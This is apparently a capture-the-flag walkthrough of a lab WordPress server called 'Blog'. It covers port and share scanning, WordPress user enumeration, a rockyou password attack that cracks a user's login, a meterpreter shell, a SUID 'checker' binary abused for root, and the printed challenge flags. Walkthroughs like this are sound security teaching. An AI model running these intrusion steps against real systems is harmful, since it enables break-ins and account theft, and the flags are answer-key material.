Creating an environment variable called IP and assigning it the value of the machine.

```
$ export IP=10.10.6.219
```

**Using Nmap to Identify Service Versions and Gather Additional Information:**

To discover the services running on open ports and gather more information using default scripts, I used the following Nmap command:

```
$ nmap -sV -sC $IP
Starting Nmap 7.60 ( https://nmap.org ) at 2020-07-11 09:42 -03
Nmap scan report for 10.10.6.219
Host is up (0.24s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.35 seconds
```
**Key Findings:**

    Open Ports: Identified four open ports (22, 80, 139, 445).
    HTTP Server: Discovered an Apache HTTP server (version 2.4.29) running on port 80.
    Samba Server: Detected Samba services on ports 139 and 445.
    SSH Service: Found an OpenSSH service on port 22.

With this information, I determined I decided my next steps to explore the machine are the following

    Directory Enumeration: I used Gobuster to search for hidden directories or files on the web server.
    Vulnerability Scanning: I ran Nikto to check the Apache server for known vulnerabilities.
    Share enumeration: I used enum4linux to gather more information about Samba shares and users:

**Directory Enumeration**

Run the following command:

enum4linux $IP

```
 ==================================( Share Enumeration on 10.10.57.77 )==================================
                                                                                                                                                                      
                                                                                                                                                                      
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        BillySMB        Disk      Billy's local SMB Share
        IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            BLOG

[+] Attempting to map shares on 10.10.57.77                                                                                                                           
                                                                                                                                                                      
//10.10.57.77/print$    Mapping: DENIED Listing: N/A Writing: N/A                                                                                                     
//10.10.57.77/BillySMB  Mapping: OK Listing: OK Writing: N/A

[E] Can't understand response:                                                                                                                                        
                                                                                                                                                                      
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                                                                            
//10.10.57.77/IPC$      Mapping: N/A Listing: N/A Writing: N/A

 ============================( Password Policy Information for 10.10.57.77 )============================

```
Found a share named BillySMB that I can and list:
```
smbclient //10.10.57.77/BillySMB
Password for [WORKGROUP\andrepaiva]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue May 26 19:17:05 2020
  ..                                  D        0  Tue May 26 18:58:23 2020
  Alice-White-Rabbit.jpg              N    33378  Tue May 26 19:17:01 2020
  tswift.mp4                          N  1236733  Tue May 26 19:13:45 2020
  check-this.png                      N     3082  Tue May 26 19:13:43 2020

```
After checking the .jpg file with steghide found out this was a rabbithole and lead nowhere.

After this decided, to run gobuster against the webserver.

```
$ gobuster dir -u $IP -w /usr/share/wordlists/common.txt            
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.57.77
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/0                    (Status: 301) [Size: 0] [--> http://10.10.57.77/0/]
/admin                (Status: 302) [Size: 0] [--> http://blog.thm/wp-admin/]
/atom                 (Status: 301) [Size: 0] [--> http://10.10.57.77/feed/atom/]
/dashboard            (Status: 302) [Size: 0] [--> http://blog.thm/wp-admin/]
/embed                (Status: 301) [Size: 0] [--> http://10.10.57.77/embed/]
/favicon.ico          (Status: 200) [Size: 0]
/feed                 (Status: 301) [Size: 0] [--> http://10.10.57.77/feed/]
/index.php            (Status: 301) [Size: 0] [--> http://10.10.57.77/]
/login                (Status: 302) [Size: 0] [--> http://blog.thm/wp-login.php]
/page1                (Status: 301) [Size: 0] [--> http://10.10.57.77/]
/rdf                  (Status: 301) [Size: 0] [--> http://10.10.57.77/feed/rdf/]
/robots.txt           (Status: 200) [Size: 67]
/rss                  (Status: 301) [Size: 0] [--> http://10.10.57.77/feed/]
/rss2                 (Status: 301) [Size: 0] [--> http://10.10.57.77/feed/]
/server-status        (Status: 403) [Size: 276]
/wp-admin             (Status: 301) [Size: 313] [--> http://10.10.57.77/wp-admin/]
/wp-content           (Status: 301) [Size: 315] [--> http://10.10.57.77/wp-content/]
/wp-includes          (Status: 301) [Size: 316] [--> http://10.10.57.77/wp-includes/]
/xmlrpc.php           (Status: 405) [Size: 42]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
                                                                                                                                                                      

```

With this I found the wp-admin directory, which turned out to be a wordpress login page.

After I run WPScan to check for wordpress users:

```
└─$  wpscan --url http://$IP --enumerate u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.57.77/ [10.10.57.77]
[+] Started: Fri Oct  4 15:36:28 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://10.10.57.77/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.57.77/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.57.77/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.57.77/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.57.77/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.57.77/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.0'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.57.77/, Match: 'WordPress 5.0'

[i] The main theme could not be detected.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:02 <=========================================================================================> (10 / 10) 100.00% Time: 00:00:02

[i] User(s) Identified:

[+] bjoel
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://10.10.57.77/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] kwheel
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://10.10.57.77/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Karen Wheeler
 | Found By: Rss Generator (Aggressive Detection)

[+] Billy Joel
 | Found By: Rss Generator (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Oct  4 15:36:49 2024
[+] Requests Done: 59
[+] Cached Requests: 5
[+] Data Sent: 11.558 KB
[+] Data Received: 271.453 KB
[+] Memory used: 124.039 MB
[+] Elapsed time: 00:00:20

```
Found two users:
    - kwheel
    - bjoel

Cracking WordPress Passwords with wpscan:

Cracking WordPress Passwords with WPScan

WPScan can be used to perform password cracking attacks on WordPress sites. 
Below is an example of how to perform a dictionary attack using WPScan with a wordlist:

```
$ wpscan --url http://blog.thm/wp-login.php --passwords /usr/share/wordlists/rockyou.txt 

( ... )

[+] Performing password attack on Xmlrpc against 4 user/s
[SUCCESS] - kwheel / cutiepie1                                                                                                                                        
^Cying Billy Joel / jackie Time: 00:00:24 <                                                                                  
 | Username: kwheel, Password: cutiepie1

[!] No WPScan API Token given, as a result vulnerability data has not been output.                                            
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

```

Using the obtained credentials, we can leverage a Metasploit exploit targeting the specific WordPress version hosted on the site to gain a shell.


```
meterpreter > search -f user.txt
Found 1 result...
=================

Path                   Size (bytes)  Modified (UTC)
----                   ------------  --------------
./home/bjoel/user.txt  57            2020-05-26 21:08:47 +0100

meterpreter > cd ./home/bjoel
meterpreter > ls
Listing: /home/bjoel
====================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
020666/rw-rw-rw-  0      cha   2024-10-06 21:45:55 +0100  .bash_history
100644/rw-r--r--  220    fil   2018-04-04 19:30:26 +0100  .bash_logout
100644/rw-r--r--  3771   fil   2018-04-04 19:30:26 +0100  .bashrc
040700/rwx------  4096   dir   2020-05-25 14:15:58 +0100  .cache
040700/rwx------  4096   dir   2020-05-25 14:15:58 +0100  .gnupg
100644/rw-r--r--  807    fil   2018-04-04 19:30:26 +0100  .profile
100644/rw-r--r--  0      fil   2020-05-25 14:16:22 +0100  .sudo_as_admin_successful
100644/rw-r--r--  69106  fil   2020-05-26 19:33:24 +0100  Billy_Joel_Termination_May20-2020.pdf
100644/rw-r--r--  57     fil   2020-05-26 21:08:47 +0100  user.txt

meterpreter > cat user.txt
You won't find what you're looking for here.

TRY HARDER
```

Despite successfully locating user.txt in the /home/bjoel directory, we are unable to retrieve its contents due to insufficient privileges. 
To gain access to the file, escalating privileges on the system is required.


**Privilege escalation**

First, I used the shell command in meterpreter to have full access to standard linux shell commands.

```
meterpreter > shell
Process 1573 created.
Channel 1 created.
```

Next search for UID files to find files to use for escalating privileges

``find / -perm -u=s -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/at
/usr/bin/newgidmap
/usr/bin/traceroute6.iputils
/usr/sbin/checker
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/bin/mount
/bin/fusermount
/bin/umount
/bin/ping
/bin/su
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9066/bin/mount
/snap/core/9066/bin/ping
/snap/core/9066/bin/ping6
/snap/core/9066/bin/su
/snap/core/9066/bin/umount
/snap/core/9066/usr/bin/chfn
/snap/core/9066/usr/bin/chsh
/snap/core/9066/usr/bin/gpasswd
/snap/core/9066/usr/bin/newgrp
/snap/core/9066/usr/bin/passwd
/snap/core/9066/usr/bin/sudo
/snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9066/usr/lib/openssh/ssh-keysign
/snap/core/9066/usr/lib/snapd/snap-confine
/snap/core/9066/usr/sbin/pppd`

```

Off all these, the file /usr/sbin/checker stands out because is not an usual binary and is a root owned binary, with SUID flag on

```
$ ls -la /usr/sbin/checker     
-rwsr-sr-x 1 root root 8432 May 26 18:27 /usr/sbin/checker
```
The rws permissions show that the binary has the SUID bit set (s), meaning it will run with the privileges of the file owner (root).


```
ltrace checker
getenv("admin")                                  = nil
puts("Not an Admin")                             = 13
Not an Admin
+++ exited (status 0) +++
```
This output shows that the binary first checks the value of the admin environment variable with getenv("admin"). 
Since this variable is not set (nil), it prints "Not an Admin" and exits.

If the admin environment variable is set to 1, it runs bash as root.

```
$ export admin=1
$ ltrace checker
getenv("admin")                                  = "1"
setuid(0)                                        = -1
system("/bin/bash"
$ checker
$ id
uid=0(root) gid=33(www-data) groups=33(www-data)
```

The id command confirms that I am now root (uid=0), which means I have successfully escalated privileges.

I can now have access to both flags.

```
cat /media/usb/user.txt
c8421899aae571f7af486492b71a8ab7
cat /root/root.txt
9a0b2b618bef9bfa7ac28c1353d9f318
```














